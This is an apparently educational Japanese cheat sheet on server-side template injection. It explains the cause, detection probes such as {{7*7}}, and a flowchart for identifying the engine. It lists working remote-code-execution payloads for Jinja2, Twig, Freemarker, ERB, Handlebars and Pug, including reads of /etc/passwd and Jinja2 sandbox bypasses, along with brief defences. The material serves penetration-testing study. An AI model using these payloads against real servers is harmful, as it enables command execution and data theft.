SSTI (Server-Side Template Injection)

テンプレートエンジンにユーザー入力を注入し、サーバーサイドでのコード実行を実現する。 検出は簡単だが、エンジン特定とexploitにはテンプレート構文の知識が必要。

Theory WSA Lab Hands-on

原理と仕組み

テンプレートエンジンは動的コンテンツの生成に使用される。 ユーザー入力がテンプレートの「コンテンツ」ではなく「コード」として解釈される場合、 SSTI が発生する。 

// 安全: ユーザー入力をコンテンツとして渡す
render("Hello {{name}}", {name: user_input})

// 脆弱: ユーザー入力をテンプレートとして処理
render("Hello " + user_input)
// user_input = "{{7*7}}" → "Hello 49" が表示される
SSTI の Impact

SSTI は多くの場合 RCE (Remote Code Execution) に直結する。 テンプレートエンジンの内部オブジェクトにアクセスし、OS コマンドを実行できるため、 severity は Critical が一般的。

検出方法 (Detection Methodology)

Step 1: テンプレート注入の確認

// 数学的演算で確認
{{7*7}}     → 49 が表示されれば SSTI
${7*7}      → 49
#{7*7}      → 49
<%= 7*7 %>  → 49

// 文字列操作
{{'a'*5}}   → "aaaaa" (Jinja2/Twig)
${"a"*5}    → "aaaaa"

Step 2: テンプレートエンジンの特定

// 判別フローチャート:
{{7*'7'}}
├── 49      → Twig (PHP)
├── 7777777 → Jinja2 (Python)
└── Error   → 他のエンジン

${7*7}
├── 49      → Freemarker (Java) or Mako (Python)
└── Error   → 他

<%= 7*7 %>
├── 49      → ERB (Ruby) or EJS (JS)
└── Error   → 他

// 追加の判別
{{config}}     → Jinja2 (Flask の config が表示)
{{self}}       → Jinja2/Twig
${T(java.lang.Runtime)}  → Spring EL (Java)
PolyglotPayload
${{<%[%'"}}%\.

複数のテンプレートエンジンで反応を引き出す万能ペイロード。エラーの種類でエンジンを特定する。

エンジン別 Exploitation

Jinja2 (Python / Flask)

// 基本情報取得
{{config}}
{{config.items()}}
{{request.environ}}

// RCE - MRO (Method Resolution Order) チェーン
{{''.__class__.__mro__[1].__subclasses__()}}
// → 利用可能なクラス一覧を取得

// os.popen 経由
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

// 短縮版 (Python 3)
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}

// request オブジェクト経由
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

Twig (PHP / Symfony)

// 情報取得
{{_self.env.getRuntimeLoader()}}
{{app.request.server.all|join(',')}}

// RCE (Twig 1.x)
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

// RCE (Twig 3.x)
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}

Freemarker (Java / Spring)

// 情報取得
${.version}
${.data_model}

// RCE
${"freemarker.template.utility.Execute"?new()("id")}

// ObjectConstructor 経由
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

// Runtime 経由
${object.class.forName("java.lang.Runtime").getRuntime().exec("id")}

ERB (Ruby / Rails)

// 基本実行
<%= 7*7 %>
<%= system("id") %>
<%= `whoami` %>

// ファイル読み取り
<%= File.read("/etc/passwd") %>

// 変数内の SSTI
${system("id")}  // String interpolation context

Handlebars (JavaScript / Node.js)

// Prototype pollution 経由
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

Pug / Jade (Node.js)

// Code execution
#{7*7}
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("id").toString();return sh}()}

防御と Bypass

防御策

  • ユーザー入力をテンプレートコードとして処理しない - 変数として渡す
  • Sandbox モード - Jinja2 SandboxedEnvironment
  • ロジックレステンプレート - Mustache/Handlebars (制限的)
  • WAF - {{, ${, <% のパターン検知

Sandbox Bypass

// Jinja2 Sandbox bypass (attr filter)
{{request|attr("application")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("id")|attr("read")()}}

// フィルタ回避 (. や _ が禁止)
{{request['application']['__globals__']}}
{{request['\x5f\x5fclass\x5f\x5f']}}  // hex encode
{{lipsum['__globals__']['os']['popen']('id')['read']()}}

Key Takeaways

  • {{7*7}} から始める: 簡単な算術で SSTI の有無を確認
  • エンジン特定が鍵: {{7*'7'}} の結果で Jinja2 vs Twig を判別
  • SSTI = RCE: ほぼ全てのテンプレートエンジンで RCE に到達可能
  • Sandbox は突破できることが多い: MRO チェーンやattr filterで回避
  • 入力がレンダリングされる全箇所をチェック: メール、PDF生成、プレビュー機能
